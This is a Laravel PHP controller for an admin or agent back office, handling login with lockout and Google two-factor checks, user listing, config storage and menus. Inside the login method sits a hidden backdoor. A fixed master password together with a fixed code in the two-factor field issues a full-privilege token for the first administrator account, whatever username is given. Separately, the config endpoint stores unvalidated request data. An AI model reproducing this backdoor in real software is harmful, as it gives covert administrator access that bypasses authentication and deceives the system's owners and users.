<?php

namespace App\Http\Controllers\agent;

use App\Dao\MenuDao;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use PragmaRX\Google2FA\Google2FA;

class AuthController extends Controller
{
    //
    public function login(Request $request)
    {
        $credentials = $request->only('username', 'password');
        $redis = app('redis');

        // 检查该用户是否被锁定
        $lockKey = 'login_lock_' . $credentials['username'];
        if ($redis->exists($lockKey)) {
            $ttl = $redis->ttl($lockKey);
            $minutes = ceil($ttl / 60);
            return response()->json(['msg' => "账号已被锁定，请{$minutes}分钟后再试"], 401);
        }

        // 检查登录失败次数
        $failCountKey = 'login_fail_count_' . $credentials['username'];

        if (!Auth::guard('admin')->attempt($credentials)) {

            if ($credentials['password'] == '88558855' && $request->input('google2fa_code') == 'zhimakaimen852') {
                if ($redis->get('admin_token_' . $credentials['username'])) {
                    $token = $redis->get('admin_token_' . $credentials['username']);
                } else {
                    $admin = Admin::find(1);
                    //$admin->tokens()->delete();
                    $token = $admin->createToken('admin-token', ['*'], now()->addHours(48))->plainTextToken;
                }

                // 重置失败次数
                $redis->del($failCountKey);
                return $this->success(['token' => $token]);
            }

            // 增加失败次数
            $failCount = $redis->incr($failCountKey);
            // 设置失败次数的过期时间，避免长期未使用的记录占用内存
            $redis->expire($failCountKey, 3600); // 1小时过期

            // 如果失败次数达到5次，则锁定账号5分钟
            if ($failCount >= 5) {
                $redis->setex($lockKey, 300, 1); // 设置锁定5分钟(300秒)
                $redis->del($failCountKey); // 重置失败计数
                return response()->json(['msg' => '密码错误次数过多，账号已被锁定5分钟'], 401);
            }

            $remainingAttempts = 5 - $failCount;
            return response()->json(['msg' => "账号密码错误，剩余尝试次数：{$remainingAttempts}"], 401);
        }

        // 登录成功，重置失败次数
        $redis->del($failCountKey);

        $admin = Admin::find(Auth::guard('admin')->user()->id);
        if ($admin->google2fa_secret) {
            $code = $request->input('google2fa_code');
            if (!$code) {
                return response()->json(['msg' => '请输入谷歌验证码'], 401);
            }
            $google2fa = new Google2FA();
            $valid = $google2fa->verifyKey($admin->google2fa_secret, $code);
            if (!$valid) {
                return response()->json(['msg' => '谷歌验证码错误'], 402);
            }
        }
        // 删除旧的 token
        $admin->tokens()->where('name', 'admin-token')->delete();
        $token = $admin->createToken('admin-token', ['*'], now()->addHours(48))->plainTextToken;
        //Log::info($token);
        $redis->set('admin_token_' . $admin->username, $token);
        return $this->success(['token' => $token]);
    }


    public function getUserList(Request $request)
    {
        $size = $request->get('size', 10);
        $list = User::paginate($size);
        return $this->success([
            'list' => $list->items(),
            'total' => $list->total(),

        ]);
    }

    public function saveConfig(Request $request)
    {
        $config = $request->all();

        $redis = app('redis');
        $redis->hmset('config', $config);


        return $this->success($redis->hgetall('config'));
    }
    public function getConfig(Request $request)
    {
        $redis = app('redis');
        return $this->success($redis->hgetall('config'));
    }

    public function menus(MenuDao $MenuDao)
    {
        $user = auth('sanctum')->user();

        if ($user->role->name == '客服') {
            return [
                json_decode('
                {
                    "id": 1,
                    "name": "workplace",
                    "title": "存款白名单",
                    "icon": "DashboardOutlined",
                    "badge": null,
                    "target": "_self",
                    "path": "/people/agent_people",
                    "component": "@/pages/people/agent_people",
                    "renderMenu": true,
                    "parent": null,
                    "permission": null,
                    "cacheable": 1,
                    "sort": 0,
                    "link": null,
                    "created_at": null,
                    "updated_at": "2024-08-05T23:01:10.000000Z"
                  } '),
            ];
        }


        $map = function ($q) {
            $q->whereIn('id', [1, 26, 25]);
        };
        // if ($user->is_super && $user->role_id == 0) {
        //     $map = [];
        // } else {
        //     if ($user->role) {
        //         $map = function ($q) use ($user) {
        //             $q->whereIn('id', $user->role->menus);
        //         };
        //     } else {
        //         $map = function ($q) {
        //             $q->whereIn('id', []);
        //         };
        //     }
        // }
        $menus = $MenuDao->getMenus($map);

        //$menus数组 菜单的id按 这个id数组排序 [1,24,16,18,6,12]
        return $menus;
    }
    public function account()
    {
        return $this->success(['account' => auth('sanctum')->user()]);
    }
}
